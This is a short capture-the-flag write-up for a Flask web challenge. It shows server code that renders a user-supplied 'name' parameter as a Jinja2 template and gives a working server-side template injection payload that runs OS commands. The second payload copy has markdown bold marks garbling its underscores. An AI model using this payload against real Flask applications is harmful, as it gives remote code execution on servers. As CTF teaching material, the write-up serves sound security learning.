# whats-your-name-part2:Web

Flag Proof: `CTF{75df3454a132fcdd37d94882e343c6a23e961ed70f8dd88195345aa874c63e63}`

## Summary:

- Taking a look at the page, we see a flask debugging error page
- It seems to be using templates to show the name we put in a GET param back to us

```python
@app.route("/")

def home():

        output = request.args.get('name')
        output = render_template_string(output)
```

- Knowing this now it is obviously that this is about a SSTI (Server-Side-Template-Injection)
    - Using these two sites
        - [https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/](https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/)
        - [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
    - Can get us a good understanding about SSTI and how it works, and also gives us the payload we need to exploit it.
    - This one-liner is the easiest way to do it ( the other way is doing it manually and searching for the proper class to give us RCE
    
    ```python
    {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
    ```
    
- Using this payload as a name parameter will give us the flag
    - `{{request.application.**globals**.**builtins**.**import**('os').popen('cat flag').read()}}`
    
    ![Untitled](whats-your-name-part2%20Web%20127d6131f73c4b7f91601a56a4a71580/Untitled.png)